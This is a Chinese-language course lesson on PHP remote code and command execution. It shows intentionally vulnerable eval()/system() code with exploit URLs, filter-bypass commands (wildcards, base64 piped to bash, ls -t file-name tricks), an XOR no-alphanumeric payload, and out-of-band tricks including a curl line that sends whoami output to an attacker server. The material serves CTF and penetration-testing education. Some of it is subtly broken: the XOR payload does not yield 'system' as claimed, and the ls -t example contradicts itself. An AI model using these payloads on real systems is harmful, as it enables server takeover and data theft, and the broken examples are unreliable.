#  058：RCE代码与命令执行漏洞详解

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_0.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_2.png)

在本节课中，我们将要学习RCE（远程代码/命令执行）漏洞的核心概念、原理、危害、常见的过滤绕过技术（包括异或无字符、无回显方案），以及如何在白盒代码审计和黑盒实战中挖掘此类漏洞。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_4.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_6.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_8.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_10.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_12.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_14.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_16.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_18.png)

## 📚 概述：什么是RCE？

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_20.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_22.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_24.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_26.png)

RCE是“远程代码/命令执行”漏洞的统称。它主要分为两类：
1.  **代码执行**：攻击者能够使应用程序执行其注入的脚本代码（如PHP、Python代码）。
2.  **命令执行**：攻击者能够使应用程序调用并执行系统命令（如`whoami`、`ipconfig`）。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_28.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_30.png)

虽然两者执行的对象不同，但在实际利用中常常可以相互转换，因此被统称为RCE漏洞，危害极大，可直接导致服务器权限沦陷。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_32.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_34.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_36.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_38.png)

---

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_40.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_42.png)

## 🔍 第一部分：漏洞原理与演示

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_44.png)

上一节我们概述了RCE的基本概念，本节中我们来看看在PHP语言中，这两类漏洞的具体代码表现。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_46.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_48.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_50.png)

### 代码执行漏洞

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_52.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_54.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_56.png)

在PHP中，某些函数如果接收了用户可控的输入并直接执行，就会造成代码执行漏洞。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_58.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_60.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_62.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_64.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_66.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_68.png)

以下是造成代码执行的常见PHP函数：
*   `eval()`
*   `assert()`
*   `preg_replace()` (配合`/e`修饰符时)
*   `create_function()`
*   `array_map()`
*   `call_user_func()`
*   `call_user_func_array()`

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_70.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_72.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_74.png)

**漏洞示例代码：**
```php
<?php
$code = $_GET[‘c‘];
eval($code);
?>
```
**利用方式：**
访问 `http://target.com/test.php?c=phpinfo();`，`phpinfo()`函数将被执行。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_76.png)

### 命令执行漏洞

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_78.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_80.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_82.png)

在PHP中，某些函数用于执行系统命令，若参数用户可控，则会造成命令执行漏洞。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_84.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_86.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_88.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_90.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_92.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_94.png)

以下是造成命令执行的常见PHP函数：
*   `system()`
*   `exec()`
*   `shell_exec()`
*   `passthru()`
*   `popen()`
*   `proc_open()`
*   `` `（反引号） ``

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_96.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_98.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_100.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_102.png)

**漏洞示例代码：**
```php
<?php
$cmd = $_GET[‘c‘];
system($cmd);
?>
```
**利用方式：**
访问 `http://target.com/test.php?c=whoami`，服务器将执行`whoami`命令并返回结果。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_104.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_106.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_108.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_110.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_112.png)

### 代码执行与命令执行的相互转换

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_114.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_116.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_118.png)

两者之所以常被统称，是因为它们可以相互转换利用。
*   **代码执行 -> 命令执行**：在代码执行中调用系统命令函数。
    ```php
    // 假设存在 eval($_GET[‘c‘]);
    // 传入参数：c=system(‘whoami‘);
    ```
*   **命令执行 -> 代码执行**：通过命令执行调用脚本解释器来运行代码。
    ```bash
    # 假设存在 system($_GET[‘c‘]);
    # 传入参数：c=php -r “phpinfo();”
    ```

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_120.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_122.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_124.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_126.png)

---

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_128.png)

## ⚔️ 第二部分：危害与利用

理解了漏洞原理后，我们来看看RCE漏洞的巨大危害。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_130.png)

RCE漏洞的危害是致命的，因为它意味着攻击者几乎可以在目标服务器上为所欲为：
1.  **直接获取WebShell**：通过代码执行漏洞写入一句话木马文件，或用工具直接连接。
2.  **反弹Shell**：通过命令执行漏洞，让服务器主动连接攻击者控制的机器，获取一个交互式命令行权限。
3.  **内网渗透**：以被攻陷的服务器为跳板，攻击内网其他机器。
4.  **数据窃取与篡改**：读取、修改或删除服务器上的敏感数据和文件。
5.  **服务器控制**：安装后门、挖矿软件，或发起进一步的攻击。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_132.png)

---

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_134.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_136.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_138.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_140.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_142.png)

## 🛡️ 第三部分：过滤绕过技术

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_144.png)

在实际的CTF比赛或安全防护中，开发者会对输入进行过滤。本节中我们来看看如何绕过这些过滤。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_146.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_148.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_150.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_152.png)

### 1. 针对命令执行的常见绕过

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_154.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_156.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_158.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_160.png)

假设过滤了`cat`、`flag`等关键字，目标是读取`flag.txt`文件。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_162.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_164.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_166.png)

以下是几种绕过方法：
*   **通配符绕过**：
    ```bash
    cat fla*
    cat fl?g.txt
    ```
*   **转义符绕过**：
    ```bash
    cat fl\ag.txt
    cat fl‘a‘g.txt
    ```
*   **变量拼接绕过**：
    ```bash
    a=fl;b=ag;cat $a$b.txt
    ```
*   **空变量绕过**：
    ```bash
    cat fla$@g.txt
    cat fla${x}g.txt
    ```
*   **反引号与命令替换**：
    ```bash
    cat `ls` # 假设当前目录只有flag.txt
    ```
*   **编码绕过**：
    ```bash
    echo ‘Y2F0IGZsYWcudHh0Cg==‘ | base64 -d | bash
    # 其中 ‘Y2F0IGZsYWcudHh0Cg==‘ 是 ‘cat flag.txt‘ 的base64编码
    ```

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_168.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_170.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_172.png)

### 2. 组合绝技（无字符文件创建）

这是一种高级技巧，通过创建特定名称的文件，再利用`ls -t`（按时间排序）将文件名组合成命令。
```bash
# 假设在/tmp目录下操作
touch a
touch “g”
touch “f”
touch “l”
touch “a”
touch “c”
ls -t > shell.sh
# 此时shell.sh文件内容为 c a l f g，即 ‘cat fg‘，但顺序可能不对
# 更可靠的方法是精心安排创建顺序，使 ls -t 输出的文件名正好是想要的命令
```

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_174.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_176.png)

### 3. 异或(XOR)与或(OR)无字符绕过（针对代码执行）

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_178.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_180.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_182.png)

当过滤了所有字母和数字时，可以利用PHP中字符串的异或(`^`)、或(`|`)运算来生成所需字符。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_184.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_186.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_188.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_190.png)

**原理**：两个非字母数字的字符进行异或/或运算，可能产生一个字母或数字。
例如： `“{“ ^ “<“` 的结果是 `“G“`。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_192.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_194.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_196.png)

**实战应用**：
1.  使用特定脚本生成针对当前过滤规则（如`/[a-z0-9]/i`）的Payload。
2.  脚本会生成类似 `$_=“{“^“<“;` 的代码片段，最终拼接成如 `$_($_GET[‘a‘])`（即 `system($_GET[‘a‘])`）的可执行代码。

**示例Payload**：
```
?c=($_=“{“^“<“).($_=“}“^“>“).($_^“/“).($_^“;“);$_();
```
经过运算，最终会执行 `system()` 函数。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_198.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_200.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_202.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_204.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_206.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_208.png)

### 4. 无回显漏洞的利用方案

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_210.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_212.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_214.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_216.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_218.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_220.png)

当命令或代码执行了，但没有输出（无回显）时，如何判断漏洞存在并利用？

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_222.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_223.png)

以下是几种方案：
*   **延时判断**：执行`sleep 5`命令，观察页面响应是否延迟。
*   **DNS外带**：执行`ping -c 1 your-domain.com`，在自己的DNS日志中查看是否有解析记录。
*   **HTTP外带**：执行`curl http://your-server.com/$(whoami)`，在自己的Web服务器日志中查看访问记录，其中包含了命令执行结果（如`whoami`的结果）。
*   **写入文件再访问**：执行`echo ‘test‘ > /tmp/test.txt`，然后尝试通过Web访问`/tmp/test.txt`（如果目录可访问）来验证。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_225.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_227.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_229.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_231.png)

---

## 🕵️ 第四部分：黑白盒挖掘思路

### 白盒挖掘（代码审计）

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_233.png)

在白盒环境中，我们直接分析源代码。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_235.png)

**核心思路**：
1.  **搜索危险函数**：在代码中全局搜索上述提到的`eval`、`assert`、`system`、`exec`等危险函数。
2.  **回溯可控参数**：检查这些危险函数的参数是否用户可控（来自`$_GET`、`$_POST`、`$_COOKIE`等）。
3.  **分析过滤逻辑**：检查用户输入在到达危险函数前，是否经过了过滤或校验。分析过滤是否可被之前介绍的技巧绕过。
4.  **寻找二次触发点**：有时参数可能先被存入数据库或文件，再在另一个页面被取出并执行，这就需要跟踪数据流。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_237.png)

### 黑盒挖掘（功能测试）

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_239.png)

在黑盒环境中，我们不知道代码逻辑，需要从功能点推测。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_241.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_243.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_245.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_247.png)

**可能存在RCE的功能点**：
*   **网站管理功能**：模板编辑、主题安装、插件安装、数据库备份（可能调用mysqldump命令）。
*   **在线工具**：在线代码执行、在线命令执行、Ping测试、DNS查询、Trace路由。
*   **文件处理功能**：文件压缩/解压、视频转码、图片处理（可能调用ImageMagick命令）。
*   **系统管理功能**：服务器监控、日志查看、进程管理。
*   **硬件设备管理界面**：路由器、防火墙、NAS等设备的Web管理界面，常涉及命令执行。
*   **已知漏洞利用**：关注目标系统使用的框架、CMS、中间件、组件是否存在公开的RCE漏洞。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_249.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_251.png)

**测试方法**：
1.  找到上述可疑功能点。
2.  尝试输入简单的测试命令或代码（如`whoami`、`phpinfo()`）。
3.  观察响应，判断是否执行。
4.  如果存在过滤，尝试使用绕过技术。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_253.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_255.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_257.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_259.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_261.png)

---

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_263.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_265.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_267.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_269.png)

## 📝 总结

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_271.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_273.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_275.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_276.png)

本节课中我们一起学习了RCE漏洞的完整知识体系：
1.  **概念区分**：理解了代码执行与命令执行的联系与区别。
2.  **原理与危害**：通过PHP代码示例掌握了漏洞产生的原因，并认识到其可直接导致服务器失陷的严重危害。
3.  **绕过技术**：系统学习了从基础的通配符、编码绕到高级的组合绝技、异或无字符绕过的多种方法，并掌握了无回显漏洞的利用思路。
4.  **挖掘思路**：建立了白盒代码审计中搜索危险函数、回溯参数、分析过滤的逻辑，以及黑盒测试中关注高危功能点、结合已知漏洞进行测试的方法。

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_278.png)

![](img/d10a605f9ee06e6a2f96eef0e9e5e959_280.png)

RCE漏洞是Web安全中危险性最高、也最考验攻击者技巧的漏洞之一。深入理解本章内容，无论是对于CTF竞赛、渗透测试还是代码审计工作，都有着至关重要的意义。